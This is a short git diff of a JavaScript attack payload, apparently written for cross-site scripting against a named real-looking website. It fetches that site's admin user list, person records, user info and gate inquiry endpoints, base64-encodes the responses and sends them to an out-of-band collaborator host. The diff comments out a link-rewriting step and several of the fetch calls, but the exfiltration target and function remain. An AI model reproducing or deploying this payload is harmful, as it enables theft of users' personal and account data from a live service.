@@ -22,18 +22,15 @@ function fetchEncodeAndSend(originalUrl, targetUrlBase) {
 }
 
 // Select all <a> elements with href="/panel"
-var links = document.querySelectorAll('a[href="/panel"]');
+//var links = document.querySelectorAll('a[href="/panel"]');
 
 // Check if the NodeList is not empty
-if (links.length > 0) {
-    links.forEach(function(link) {
-        link.href = '/announcements/2'; // Change the href to the new path for each element
-    });
-}
+//if (links.length > 0) {
+    //links.forEach(function(link) {
+        //link.href = '/announcements/2'; // Change the href to the new path for each element
+    //});
+//}
 
 var targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
-fetchEncodeAndSend('https://my.daryakenar.ir/api/Admin/Users', targetUrlBase);
-fetchEncodeAndSend('https://my.daryakenar.ir/api/Persons', targetUrlBase);
-fetchEncodeAndSend('https://my.daryakenar.ir/connect/userinfo', targetUrlBase);
-fetchEncodeAndSend('https://my.daryakenar.ir/api/Gates/1/inquires/person', targetUrlBase);
+//fetchEncodeAndSend('https://my.daryakenar.ir/api/Gates/1/inquires/person', targetUrlBase);
 
